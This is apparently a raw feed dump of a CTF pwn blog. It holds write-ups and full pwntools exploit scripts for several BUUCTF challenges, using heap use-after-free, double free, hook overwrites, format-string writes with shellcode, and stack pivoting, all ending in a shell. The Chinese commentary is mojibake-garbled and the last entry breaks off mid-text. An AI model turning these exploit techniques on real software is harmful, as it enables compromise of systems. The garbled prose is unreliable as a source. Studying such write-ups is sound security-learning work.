*#p=remote(&quot;node5.buuoj.cn&quot;,25861)p=process(&quot;./starctf_2019_girlfriend&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.23.so&#39;)def debug():    gdb.attach(p)    sleep(1)def add(size,content1,content2):    p.sendlineafter(&#39;Input your choice:&#39;,&#39;1&#39;)    p.sendlineafter(&quot;girl&#39;s name&quot;,str(size))    p.sendlineafter(&#39;please inpute her name:&#39;,content1)    p.sendlineafter(&#39;please input her call:&#39;,content2)def show(index):    p.sendlineafter(&#39;Input your choice:&#39;,&#39;2&#39;)    p.sendlineafter(&#39;Please input the index:&#39;,str(index))def free(index):    p.sendlineafter(&#39;Input your choice:&#39;,&#39;4&#39;)    p.sendlineafter(&#39;Please input the index:&#39;,str(index))#add(0x20,&#39;aaaa&#39;,&#39;bbbb&#39;)add(0x80,&#39;aaaa&#39;,&#39;bbbb&#39;)add(0x60,&#39;cccc&#39;,&#39;ssss&#39;)add(0x60,&#39;dddd&#39;,&#39;eeee&#39;)free(0)show(0)p.recvuntil(&#39;name:&#39;)main_arena=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))print(&#39;main_arena&#39;+hex(main_arena))malloc_hook=main_arena-88-0x10base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]free(2)free(1)free(2)one = [0x45226, 0x4527a, 0xf03a4, 0xf1147]one_gadget=base+one[3]realloc=libc.sym[&#39;realloc&#39;]+baseadd(0x60,p64(malloc_hook-0x23),p64(malloc_hook-0x23))add(0x60,&#39;cccc&#39;,&#39;dddd&#39;)add(0x60,&#39;dddd&#39;,&#39;eeee&#39;)print(&#39;one_gadget=&#39;+hex(one_gadget)+&#39;   malloc-0x23=&#39;+hex(malloc_hook-0x23)+&#39;   realloc=&#39;+hex(realloc))payload=b&#39;a&#39;*(0x13-8)+p64(one_gadget)+p64(realloc+2)add(0x60,payload,&#39;cccc&#39;)debug()p.sendafter(&#39;Input your choice:&#39;,&#39;1&#39;)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ACTF_2019_message</title>
      <link href="/2024/03/05/ACTF-2019-message/"/>
      <url>/2024/03/05/ACTF-2019-message/</url>
      
        <content type="html"><![CDATA[<p>æœ‰uafæ¼æ´ï¼Œä½†æ˜¯æ‰“å°çš„è¯ä¼šæ£€æŸ¥sizeï¼Œæ‰€ä»¥ä¸èƒ½ç®€å•åœ°uaf</p><p><img src="https://i0.imgs.ovh/2024/03/04/OYMIU.png" alt="image-20240305192928168"></p><pre><code class="lang-py">add(0x200,&#39;aaaa&#39;)add(0x200,&#39;aaaa&#39;)free(0)free(0)add(0x200,p64(0x60204c))add(0x200,&#39;aaaa&#39;)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/04/OYkHR.png" alt="image-20240305194658879"></p><p>æˆåŠŸæ§åˆ¶å †æŒ‡é’ˆ</p><pre><code>payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*20add(0x200,payload)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/04/OYScj.png" alt="image-20240305201228735"></p><pre><code class="lang-py">for i in range(8):    add(0x80,&#39;aaaa&#39;)#8for i in range(1,7):    free(i)free(8)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/04/OYQSJ.png" alt="image-20240305201734649"></p><h5 id="addçš„å¤§å°æ˜¯0x80ï¼Œä¿è¯äº†æ»¡çš„æ—¶ä¾¯çš„é‚£ä¸ªbinæ”¾åœ¨unsorted-binï¼Œæœ€åä¸¤ä¸ªå€’åºé‡Šæ”¾ï¼Œé˜²æ­¢å’Œtop-chunkåˆå¹¶"><a href="#addçš„å¤§å°æ˜¯0x80ï¼Œä¿è¯äº†æ»¡çš„æ—¶ä¾¯çš„é‚£ä¸ªbinæ”¾åœ¨unsorted-binï¼Œæœ€åä¸¤ä¸ªå€’åºé‡Šæ”¾ï¼Œé˜²æ­¢å’Œtop-chunkåˆå¹¶" class="headerlink" title="addçš„å¤§å°æ˜¯0x80ï¼Œä¿è¯äº†æ»¡çš„æ—¶ä¾¯çš„é‚£ä¸ªbinæ”¾åœ¨unsorted binï¼Œæœ€åä¸¤ä¸ªå€’åºé‡Šæ”¾ï¼Œé˜²æ­¢å’Œtop chunkåˆå¹¶"></a>addçš„å¤§å°æ˜¯0x80ï¼Œä¿è¯äº†æ»¡çš„æ—¶ä¾¯çš„é‚£ä¸ªbinæ”¾åœ¨unsorted binï¼Œæœ€åä¸¤ä¸ªå€’åºé‡Šæ”¾ï¼Œé˜²æ­¢å’Œtop chunkåˆå¹¶</h5><pre><code class="lang-py">free(7)</code></pre><p>å †7æŒ‡é’ˆæ˜¯main_arena+96</p><p><img src="https://i0.imgs.ovh/2024/03/04/OYJC9.png" alt="image-20240305202521878"></p><p>æˆ‘è¯•äº†è¿™ç§æ–¹æ³•ä¹Ÿå¯ä»¥showå‡ºæ¥ï¼Œä¸è¿‡editçš„æ—¶å€™ä¸èƒ½sendlineï¼Œä¸ç„¶ä¼šè¦†ç›–æ‰ä¸€ä¸ªå­—èŠ‚ï¼Œå¯¼è‡´showçš„åœ°å€å‡ºé”™</p><pre><code class="lang-py">payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*12+p64(0x80)edit(0,payload)show(7)</code></pre><p>è¿™é‡Œå› ä¸ºç”¨sendlineæ‰€ä»¥å‡ºé”™äº†</p><p><img src="https://i0.imgs.ovh/2024/03/04/O875W.png" alt="image-20240305203854218"></p><p>æˆ–è€…ç”¨å¸ˆå‚…çš„åšæ³•ï¼Œä¸è¿‡æˆ‘çš„æ›´ç®€å•</p><pre><code class="lang-py">edit(0,payload)for i in range(7):    add(0x80,&#39;aaaa&#39;)add(0x8,&#39;aaaaaaa&#39;) #å †8ï¼Œä¼šåœ¨unsorted biné‡Œæ‹¿show(8)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/05/QAzk0.png" alt="image-20240306185549924"></p><pre><code class="lang-py">r.recvuntil(&#39;The message: aaaaaaa&#39;)main_arena=u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-224 #è¿™é‡Œå‡0x80å†å‡96#libc2.23å’Œ2.27éƒ½æ˜¯__malloc_hook=main_arena-0x10print(&#39;main_&#39;+hex(main_arena))base=main_arena-0x10-libc.sym[&#39;__malloc_hook&#39;]</code></pre><pre><code class="lang-py">payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0x80)+p64(binsh)+p64(0x80)+p64(free_hook)edit(0,payload)edit(2,p64(system))</code></pre><p><img src="https://i0.imgs.ovh/2024/03/05/QA4wm.png" alt="image-20240306190111092"></p><p>æœ€åæœ‰ä¸ªåœ°æ–¹å°±æ˜¯free(1)ä¼šæŠ¥é”™ï¼Œå¾—åˆ†å¼€æˆ–è€…æ‰‹åŠ¨</p><p>exp</p><pre><code class="lang-python">from pwn import*from LibcSearcher import *#r=remote(&quot;node5.buuoj.cn&quot;,29647)r=process(&quot;./ACTF_2019_message&quot;)context.log_level=&quot;debug&quot;context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)libc=ELF(&#39;./libc-2.27.so&#39;)elf=ELF(&#39;./ACTF_2019_message&#39;)def choice(nu):    r.sendlineafter(&#39;choice: &#39;, str(nu))def add(size,content):    choice(1)    r.sendlineafter(&#39;length of message:\n&#39;, str(size))    r.sendlineafter(&#39;input the message:\n&#39;, content)def free(idx):    choice(2)    r.sendlineafter(&#39;you want to delete:\n&#39;, str(idx))def edit(idx, content):    choice(3)    r.sendlineafter(&#39;you want to edit:\n&#39;, str(idx))    r.sendlineafter(&#39;edit the message:\n&#39;, content )def show(idx):    choice(4)    r.sendlineafter(&#39;want to display:\n&#39;, str(idx))add(0x200,&#39;aaaa&#39;) #0add(0x200,&#39;aaaa&#39;) #1free(0)free(0)add(0x200,p64(0x60204c))add(0x200,&#39;aaaa&#39;)payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*20add(0x200,payload) #0for i in range(8):    add(0x80,&#39;aaaa&#39;)#8for i in range(1,7):    free(i)free(8) free(7)edit(0,payload)for i in range(7):    add(0x80,&#39;aaaa&#39;)add(0x10,&#39;aaaaaaa&#39;)show(8)r.recvuntil(&#39;The message: aaaaaaa&#39;)main_arena=u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-224print(&#39;main_&#39;+hex(main_arena))base=main_arena-0x10-libc.sym[&#39;__malloc_hook&#39;]free_hook=base+libc.sym[&#39;__free_hook&#39;]system=base+libc.sym[&#39;system&#39;]binsh=base+ next(libc.search(b&#39;/bin/sh&#39;))print(hex(system))payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0x80)+p64(binsh)+p64(0x80)+p64(free_hook)edit(0,payload)edit(2,p64(system))#gdb.attach(r)#sleep(1)r.sendlineafter(&#39;choice: &#39;,&#39;2&#39;)r.sendlineafter(&#39;you want to delete:\n&#39;,&#39;1&#39;)# æœ‰æ—¶å€™å¾—æ‰‹åŠ¨free(1),ä¸ç„¶æ‰“ä¸é€šï¼Œå¾ˆç¦»è°±#free(1)r.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ACTF_2019_OneRepeater</title>
      <link href="/2024/03/02/ACTF-2019-OneRepeater/"/>
      <url>/2024/03/02/ACTF-2019-OneRepeater/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/01/78XMV.png" alt="image-20240302161950112"></p><h5 id="æœ‰å¯è¯»å¯å†™å¯æ‰§è¡Œæ®µï¼Œæ˜¯é“æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ï¼Œç”¨shellcodeåš"><a href="#æœ‰å¯è¯»å¯å†™å¯æ‰§è¡Œæ®µï¼Œæ˜¯é“æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ï¼Œç”¨shellcodeåš" class="headerlink" title="æœ‰å¯è¯»å¯å†™å¯æ‰§è¡Œæ®µï¼Œæ˜¯é“æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ï¼Œç”¨shellcodeåš"></a>æœ‰å¯è¯»å¯å†™å¯æ‰§è¡Œæ®µï¼Œæ˜¯é“æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ï¼Œç”¨shellcodeåš</h5><p><img src="https://i0.imgs.ovh/2024/03/01/78V9I.png" alt="image-20240302162059697"></p><p>1è¾“å…¥ï¼Œä¼šæ‰“å°å˜é‡çš„æ ˆåœ°å€ï¼Œ2æ ¼å¼åŒ–ï¼Œå¯å¤šæ¬¡æ ¼å¼åŒ–ï¼Œè¿”å›åœ°å€å¾—åœ¨åŸæ¥çš„åŸºç¡€ä¸ŠåŠ 0x10ï¼Œå› ä¸ºè¿™é‡Œleaveä»¥åå¹¶æ²¡æœ‰ç«‹å³ret,è€Œæ˜¯lea     esp, [ecx-4]ï¼Œè°ƒè¯•å‘ç°æ—¶æ˜¯add esp, 0x10ï¼Œæ‰€ä»¥ret_addr=0x408+0x10+4</p><p><img src="https://i0.imgs.ovh/2024/03/01/78xet.png" alt="image-20240302165416987"></p><p>exp</p><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;node5.buuoj.cn&quot;,29221)#p=process(&quot;./ACTF_2019_OneRepeater&quot;)context.log_level=&quot;debug&quot;context(log_level=&#39;debug&#39;,arch=&#39;i386&#39;,os=&#39;linux&#39;)offset=16p.sendlineafter(&#39;Exit&#39;,&#39;1&#39;)p.recvline()addr = int(p.recv(8).strip(), 16)ret_addr=addr+0x418+4print(&#39;addr&#39;+hex(addr))&#39;&#39;&#39;payload=p32(ret_addr)+b&#39;%&#39;+str(addr%65536-4).encode()+b&#39;c&#39;+b&#39;%16$hn&#39;p.sendline(payload)p.sendlineafter(&#39;3) Exit&#39;,&#39;2&#39;)p.sendlineafter(&#39;3) Exit&#39;,&#39;1&#39;)payload=p32(ret_addr+2)+b&#39;%&#39;+str(addr//65536-4).encode()+b&#39;c&#39;+b&#39;%16$hn&#39;p.sendline(payload)&#39;&#39;&#39;payload=p32(ret_addr)+p32(ret_addr+2)+b&#39;%&#39;+str(addr%65536-8).encode()+b&#39;c&#39;+b&#39;%16$hn&#39;+b&#39;%&#39;+str(addr//65536-addr%65536).encode()+b&#39;c%17$hn&#39;p.sendline(payload)p.sendlineafter(&#39;3) Exit&#39;,&#39;2&#39;)p.sendlineafter(&#39;3) Exit&#39;,&#39;1&#39;)#gdb.attach(p)sleep(1)p.sendline(asm(shellcraft.sh()))p.sendlineafter(&#39;3) Exit&#39;,&#39;3&#39;)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>checkin</title>
      <link href="/2024/02/29/checkin/"/>
      <url>/2024/02/29/checkin/</url>
      
        <content type="html"><![CDATA[<h5 id="æŒºæœ‰æ„æ€çš„ä¸€é“æ ˆè¿ç§»"><a href="#æŒºæœ‰æ„æ€çš„ä¸€é“æ ˆè¿ç§»" class="headerlink" title="æŒºæœ‰æ„æ€çš„ä¸€é“æ ˆè¿ç§»"></a>æŒºæœ‰æ„æ€çš„ä¸€é“æ ˆè¿ç§»</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7XZ5K.png" alt="image-20240229143947006"></p><h5 id="s1æ˜¯å…¨å±€å˜é‡ï¼Œè¿™é‡Œå†™ropæ³„éœ²gotè¡¨åœ°å€"><a href="#s1æ˜¯å…¨å±€å˜é‡ï¼Œè¿™é‡Œå†™ropæ³„éœ²gotè¡¨åœ°å€" class="headerlink" title="s1æ˜¯å…¨å±€å˜é‡ï¼Œè¿™é‡Œå†™ropæ³„éœ²gotè¡¨åœ°å€"></a>s1æ˜¯å…¨å±€å˜é‡ï¼Œè¿™é‡Œå†™ropæ³„éœ²gotè¡¨åœ°å€</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7Xnr2.png" alt="image-20240229144209910"></p><h5 id="ä¸ºäº†å†ä¸€æ¬¡æ‰§è¡Œç¨‹åºï¼Œropåé¢æ¥çš„ä¸æ˜¯puts-plt"><a href="#ä¸ºäº†å†ä¸€æ¬¡æ‰§è¡Œç¨‹åºï¼Œropåé¢æ¥çš„ä¸æ˜¯puts-plt" class="headerlink" title="ä¸ºäº†å†ä¸€æ¬¡æ‰§è¡Œç¨‹åºï¼Œropåé¢æ¥çš„ä¸æ˜¯puts_plt"></a>ä¸ºäº†å†ä¸€æ¬¡æ‰§è¡Œç¨‹åºï¼Œropåé¢æ¥çš„ä¸æ˜¯puts_plt</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7XpyV.png" alt="image-20240229144608441"></p><h5 id="è€Œæ˜¯è°ƒç”¨putså‡½æ•°çš„åœ°å€ï¼Œæ—¢èƒ½æ³„éœ²gotè¡¨åœ°å€ï¼Œåˆèƒ½å†æ‰§è¡Œä¸€æ¬¡ç¨‹åºã€‚"><a href="#è€Œæ˜¯è°ƒç”¨putså‡½æ•°çš„åœ°å€ï¼Œæ—¢èƒ½æ³„éœ²gotè¡¨åœ°å€ï¼Œåˆèƒ½å†æ‰§è¡Œä¸€æ¬¡ç¨‹åºã€‚" class="headerlink" title="è€Œæ˜¯è°ƒç”¨putså‡½æ•°çš„åœ°å€ï¼Œæ—¢èƒ½æ³„éœ²gotè¡¨åœ°å€ï¼Œåˆèƒ½å†æ‰§è¡Œä¸€æ¬¡ç¨‹åºã€‚"></a>è€Œæ˜¯è°ƒç”¨putså‡½æ•°çš„åœ°å€ï¼Œæ—¢èƒ½æ³„éœ²gotè¡¨åœ°å€ï¼Œåˆèƒ½å†æ‰§è¡Œä¸€æ¬¡ç¨‹åºã€‚</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7XMJI.png" alt="image-20240229144545776"></p><h5 id="bufåªèƒ½æº¢å‡ºåˆ°rbpï¼Œä½†æ˜¯æœ‰ä¸¤æ¬¡leaveï¼Œä¸€ä¸ªæ˜¯sub-4018C7å‡½æ•°é‡Œçš„"><a href="#bufåªèƒ½æº¢å‡ºåˆ°rbpï¼Œä½†æ˜¯æœ‰ä¸¤æ¬¡leaveï¼Œä¸€ä¸ªæ˜¯sub-4018C7å‡½æ•°é‡Œçš„" class="headerlink" title="bufåªèƒ½æº¢å‡ºåˆ°rbpï¼Œä½†æ˜¯æœ‰ä¸¤æ¬¡leaveï¼Œä¸€ä¸ªæ˜¯sub_4018C7å‡½æ•°é‡Œçš„"></a>bufåªèƒ½æº¢å‡ºåˆ°rbpï¼Œä½†æ˜¯æœ‰ä¸¤æ¬¡leaveï¼Œä¸€ä¸ªæ˜¯sub_4018C7å‡½æ•°é‡Œçš„</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7rKsK.png" alt="image-20240229151653874"></p><h5 id="ä¸Šä¸€ä¸ªå‡½æ•°ç»“æŸååˆ°sub-401876å‡½æ•°é‡Œçš„ï¼Œåˆšå¥½èƒ½æ‰§è¡Œä¸¤æ¬¡leaveã€‚"><a href="#ä¸Šä¸€ä¸ªå‡½æ•°ç»“æŸååˆ°sub-401876å‡½æ•°é‡Œçš„ï¼Œåˆšå¥½èƒ½æ‰§è¡Œä¸¤æ¬¡leaveã€‚" class="headerlink" title="ä¸Šä¸€ä¸ªå‡½æ•°ç»“æŸååˆ°sub_401876å‡½æ•°é‡Œçš„ï¼Œåˆšå¥½èƒ½æ‰§è¡Œä¸¤æ¬¡leaveã€‚"></a>ä¸Šä¸€ä¸ªå‡½æ•°ç»“æŸååˆ°sub_401876å‡½æ•°é‡Œçš„ï¼Œåˆšå¥½èƒ½æ‰§è¡Œä¸¤æ¬¡leaveã€‚</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7rbi2.png" alt="image-20240229151743757"></p><h5 id="ä¸è¿‡è¿™é‡Œ-unsigned-int-sub-401974-buf-å±å®ä¸å¤ªæ‡‚ï¼Œå¤ªæŠ½è±¡äº†ï¼Œä¹Ÿä¸çŸ¥é“å®ƒå…·ä½“æ˜¯æ€ä¹ˆæ£€æŸ¥çš„"><a href="#ä¸è¿‡è¿™é‡Œ-unsigned-int-sub-401974-buf-å±å®ä¸å¤ªæ‡‚ï¼Œå¤ªæŠ½è±¡äº†ï¼Œä¹Ÿä¸çŸ¥é“å®ƒå…·ä½“æ˜¯æ€ä¹ˆæ£€æŸ¥çš„" class="headerlink" title="ä¸è¿‡è¿™é‡Œ(unsigned int)sub_401974(buf)å±å®ä¸å¤ªæ‡‚ï¼Œå¤ªæŠ½è±¡äº†ï¼Œä¹Ÿä¸çŸ¥é“å®ƒå…·ä½“æ˜¯æ€ä¹ˆæ£€æŸ¥çš„"></a>ä¸è¿‡è¿™é‡Œ(unsigned int)sub_401974(buf)å±å®ä¸å¤ªæ‡‚ï¼Œå¤ªæŠ½è±¡äº†ï¼Œä¹Ÿä¸çŸ¥é“å®ƒå…·ä½“æ˜¯æ€ä¹ˆæ£€æŸ¥çš„</h5><h5 id="ä¸¤æ¬¡çš„payloadä¸å¤ªä¸€æ ·ã€‚"><a href="#ä¸¤æ¬¡çš„payloadä¸å¤ªä¸€æ ·ã€‚" class="headerlink" title="ä¸¤æ¬¡çš„payloadä¸å¤ªä¸€æ ·ã€‚"></a>ä¸¤æ¬¡çš„payloadä¸å¤ªä¸€æ ·ã€‚</h5><h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h5><pre><code class="lang-py">payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)p.sendafter(&#39;&gt;&#39;,payload1)payload2=b&#39;admin\x00\x00\x00&#39;+p64(0)*3+p64(bss)p.sendafter(&#39;Pass&#39;,payload2)</code></pre><h5 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h5><pre><code class="lang-py">payload1=b&#39;admin\x00\x00\x00&#39;*3+p64(one_gadget)p.sendafter(&#39;&gt;&#39;,payload1)payload2=b&#39;admin\x00\x00\x00&#39;*4+p64(bss+0x10)p.sendafter(&#39;Pass&#39;,payload2)</code></pre><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;node5.buuoj.cn&quot;,25691)#p=process(&quot;./login_pro&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc.So.6&#39;)bss=0x602400pop_rdi=0x401ab3puts_plt=0x4018b5puts_got=0x602028payload1=b&#39;admin\x00\x00\x00&#39;payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)p.sendafter(&#39;&gt;&#39;,payload1)payload2=b&#39;admin\x00\x00\x00&#39;+p64(0)*3+p64(bss)p.sendafter(&#39;Pass&#39;,payload2)p.recvuntil(&#39;BaileGeBai\n&#39;)puts_got=u64(p.recvuntil(&#39;\n&#39;,drop=True).ljust(8,b&#39;\x00&#39;))print(hex(puts_got))base=puts_got-libc.sym[&#39;puts&#39;]one=[0x45226,0x4527a,0xf03a4,0xf1247]one_gadget=base+one[1]#gdb.attach(p)sleep(1)payload1=b&#39;admin\x00\x00\x00&#39;*3+p64(one_gadget)p.sendafter(&#39;&gt;&#39;,payload1)payload2=b&#39;admin\x00\x00\x00&#39;*4+p64(bss+0x10)p.sendafter(&#39;Pass&#39;,payload2)#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_es_1</title>
      <link href="/2024/01/22/ciscn-2019-es-1/"/>
      <url>/2024/01/22/ciscn-2019-es-1/</url>
      
        <content type="html"><![CDATA[<h4 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h4><h4 id="checksecä¸€ä¸‹ï¼Œä¿æŠ¤å…¨å¼€"><a href="#checksecä¸€ä¸‹ï¼Œä¿æŠ¤å…¨å¼€" class="headerlink" title="checksecä¸€ä¸‹ï¼Œä¿æŠ¤å…¨å¼€"></a>checksecä¸€ä¸‹ï¼Œä¿æŠ¤å…¨å¼€</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJtxT.png" alt="image-20230921162920468"></p><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add<img src="https://i0.imgs.ovh/2024/01/22/sJzLl.png" alt="image-20230921163026621"></h4><h4 id="showå‡½æ•°ï¼Œå¯ä»¥è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„åœ°å€ç„¶åç®—åç§»"><a href="#showå‡½æ•°ï¼Œå¯ä»¥è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„åœ°å€ç„¶åç®—åç§»" class="headerlink" title="showå‡½æ•°ï¼Œå¯ä»¥è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„åœ°å€ç„¶åç®—åç§»"></a>showå‡½æ•°ï¼Œå¯ä»¥è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„åœ°å€ç„¶åç®—åç§»</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJgZp.png" alt="image-20230921163115792"></p><h4 id="deleteå‡½æ•°ï¼Œæ²¡æœ‰æŠŠæŒ‡é’ˆç½®é›¶ï¼Œå­˜åœ¨UAFæ¼æ´"><a href="#deleteå‡½æ•°ï¼Œæ²¡æœ‰æŠŠæŒ‡é’ˆç½®é›¶ï¼Œå­˜åœ¨UAFæ¼æ´" class="headerlink" title="deleteå‡½æ•°ï¼Œæ²¡æœ‰æŠŠæŒ‡é’ˆç½®é›¶ï¼Œå­˜åœ¨UAFæ¼æ´"></a>deleteå‡½æ•°ï¼Œæ²¡æœ‰æŠŠæŒ‡é’ˆç½®é›¶ï¼Œå­˜åœ¨UAFæ¼æ´</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJcDR.png" alt="image-20230921163210886"></p><h4 id="è¿‡ç¨‹è™½ç„¶ç†æ¸…ï¼Œä½†ä»ç„¶æœ‰ç‚¹æ‡µé€¼ã€‚"><a href="#è¿‡ç¨‹è™½ç„¶ç†æ¸…ï¼Œä½†ä»ç„¶æœ‰ç‚¹æ‡µé€¼ã€‚" class="headerlink" title="è¿‡ç¨‹è™½ç„¶ç†æ¸…ï¼Œä½†ä»ç„¶æœ‰ç‚¹æ‡µé€¼ã€‚"></a>è¿‡ç¨‹è™½ç„¶ç†æ¸…ï¼Œä½†ä»ç„¶æœ‰ç‚¹æ‡µé€¼ã€‚</h4><h4 id="å…ˆåˆ›ä¸‰ä¸ªå †"><a href="#å…ˆåˆ›ä¸‰ä¸ªå †" class="headerlink" title="å…ˆåˆ›ä¸‰ä¸ªå †"></a>å…ˆåˆ›ä¸‰ä¸ªå †</h4><pre><code class="lang-py">add(0x410,&quot;AAAA&quot;)add(0x20,&quot;AAAA&quot;)add(0x20,&quot;bin/sh&quot;)delete(0)</code></pre><h4 id="libcæ˜¯2-27ç‰ˆæœ¬ï¼Œå°±ä¼šæœ‰tachebinæœºåˆ¶ï¼Œfreeçš„å¤§å°å¤§äº0x400åˆ™å¯ä»¥ç»•è¿‡è¿™ä¸ªæœºåˆ¶ï¼Œè€Œä»–çš„fdå’ŒbkæŒ‡é’ˆéƒ½ä¼šæŒ‡å‘main-arena-96è¿™ä¸ªåœ°å€ï¼Œshowå‡½æ•°æŠŠå®ƒè¾“å‡ºå‡ºæ¥å¹¶ç®—å‡ºåç§»é‡å¹¶ç®—å‡ºfree-hookçš„åœ°å€å’Œsystemå‡½æ•°çš„åœ°å€ã€‚"><a href="#libcæ˜¯2-27ç‰ˆæœ¬ï¼Œå°±ä¼šæœ‰tachebinæœºåˆ¶ï¼Œfreeçš„å¤§å°å¤§äº0x400åˆ™å¯ä»¥ç»•è¿‡è¿™ä¸ªæœºåˆ¶ï¼Œè€Œä»–çš„fdå’ŒbkæŒ‡é’ˆéƒ½ä¼šæŒ‡å‘main-arena-96è¿™ä¸ªåœ°å€ï¼Œshowå‡½æ•°æŠŠå®ƒè¾“å‡ºå‡ºæ¥å¹¶ç®—å‡ºåç§»é‡å¹¶ç®—å‡ºfree-hookçš„åœ°å€å’Œsystemå‡½æ•°çš„åœ°å€ã€‚" class="headerlink" title="libcæ˜¯2.27ç‰ˆæœ¬ï¼Œå°±ä¼šæœ‰tachebinæœºåˆ¶ï¼Œfreeçš„å¤§å°å¤§äº0x400åˆ™å¯ä»¥ç»•è¿‡è¿™ä¸ªæœºåˆ¶ï¼Œè€Œä»–çš„fdå’ŒbkæŒ‡é’ˆéƒ½ä¼šæŒ‡å‘main_arena+96è¿™ä¸ªåœ°å€ï¼Œshowå‡½æ•°æŠŠå®ƒè¾“å‡ºå‡ºæ¥å¹¶ç®—å‡ºåç§»é‡å¹¶ç®—å‡ºfree_hookçš„åœ°å€å’Œsystemå‡½æ•°çš„åœ°å€ã€‚"></a>libcæ˜¯2.27ç‰ˆæœ¬ï¼Œå°±ä¼šæœ‰tachebinæœºåˆ¶ï¼Œfreeçš„å¤§å°å¤§äº0x400åˆ™å¯ä»¥ç»•è¿‡è¿™ä¸ªæœºåˆ¶ï¼Œè€Œä»–çš„fdå’ŒbkæŒ‡é’ˆéƒ½ä¼šæŒ‡å‘main_arena+96è¿™ä¸ªåœ°å€ï¼Œshowå‡½æ•°æŠŠå®ƒè¾“å‡ºå‡ºæ¥å¹¶ç®—å‡ºåç§»é‡å¹¶ç®—å‡ºfree_hookçš„åœ°å€å’Œsystemå‡½æ•°çš„åœ°å€ã€‚</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJR7N.png" alt="image-20230921163638325"></p><pre><code class="lang-py">show(0)malloc_hook_addr = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-96-0x10base_addr = malloc_hook_addr - libc.symbols[&#39;__malloc_hook&#39;]free_hook = base_addr + libc.symbols[&#39;__free_hook&#39;]system_addr = base_addr + libc.symbols[&#39;system&#39;]</code></pre><h4 id="ç„¶åç”¨double-freeï¼Œfreeä¸¤æ¬¡å †2ï¼Œç„¶åå †2çš„å¦‚ä¸‹ï¼Œä»¥åŠbin"><a href="#ç„¶åç”¨double-freeï¼Œfreeä¸¤æ¬¡å †2ï¼Œç„¶åå †2çš„å¦‚ä¸‹ï¼Œä»¥åŠbin" class="headerlink" title="ç„¶åç”¨double freeï¼Œfreeä¸¤æ¬¡å †2ï¼Œç„¶åå †2çš„å¦‚ä¸‹ï¼Œä»¥åŠbin"></a>ç„¶åç”¨double freeï¼Œfreeä¸¤æ¬¡å †2ï¼Œç„¶åå †2çš„å¦‚ä¸‹ï¼Œä»¥åŠbin</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJ1ju.png" alt="image-20230921164207791"></p><p><img src="https://i0.imgs.ovh/2024/01/22/sJUkd.png" alt="image-20230921164236453"></p><h4 id="binæŒ‡é’ˆé“¾0x000055ac61f846c0è¿™ä¸ªåœ°å€è®°å½•äº†å®ƒæœ¬èº«"><a href="#binæŒ‡é’ˆé“¾0x000055ac61f846c0è¿™ä¸ªåœ°å€è®°å½•äº†å®ƒæœ¬èº«" class="headerlink" title="binæŒ‡é’ˆé“¾0x000055ac61f846c0è¿™ä¸ªåœ°å€è®°å½•äº†å®ƒæœ¬èº«"></a>binæŒ‡é’ˆé“¾0x000055ac61f846c0è¿™ä¸ªåœ°å€è®°å½•äº†å®ƒæœ¬èº«</h4><h4 id="è¿™é‡Œä¹Ÿè®¸æ˜¯tachebinçš„æœºåˆ¶ï¼Œå†æ¬¡mallocæ—¶ï¼Œä¼šå…ˆåˆ›å»ºä¸€ä¸ªå †è®°å½•ä¸‹ä¸€ä¸ªå 